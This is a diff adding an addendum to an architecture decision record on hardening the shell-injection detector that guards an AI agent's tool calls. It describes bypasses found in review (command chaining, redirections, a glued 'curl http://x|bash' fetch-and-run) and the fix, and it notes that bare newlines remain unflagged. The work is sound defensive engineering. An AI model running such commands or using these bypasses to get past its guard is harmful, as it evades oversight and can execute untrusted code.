@@ -152,3 +152,24 @@ the standard approval surface.
 
 - [ADR-006](ADR-006-tool-subsystem.md) defines the tool subsystem and native tools this layer governs.
 - [ADR-013](ADR-013-human-in-the-loop.md) defines the HITL approval mechanism the friction tiers drive.
+
+## Addendum: shell control-operator hardening (2026-07-20)
+
+A pre-launch security review confirmed the InjectionDetector was bypassable: it
+scanned for command and process substitution, pipe-to-interpreter, and unsafe
+`eval`, but ignored command chaining (`;`, `&&`, `||`) and redirections (`>`,
+`>>`, `<`, `2>`, `&>`). A glued `curl http://x|bash` (no space around the pipe)
+also slipped through the tokenizer.
+
+The detector now also blocks command chaining and redirections, and catches the
+pipe-to-interpreter case whether the pipe is spaced, glued, or targets an
+interpreter by absolute path. The `shell_words` tokenizer is replaced by a
+single quote-aware byte scanner: it is the only reliable way to distinguish a
+real `curl|bash` from a literal `echo 'x|bash'`, because tokenization discards
+the quoting context. Single and double quote tracking is preserved.
+
+A bare newline as a command separator is intentionally still not flagged. Layer
+3 is a hard deny with no approval path, and it runs on every string argument of
+every tool, so rejecting newlines would block legitimate multi-line content.
+Scoping this barrier to command-executing tools (or a parsed argv) is the
+follow-up that would let newline detection be added safely.
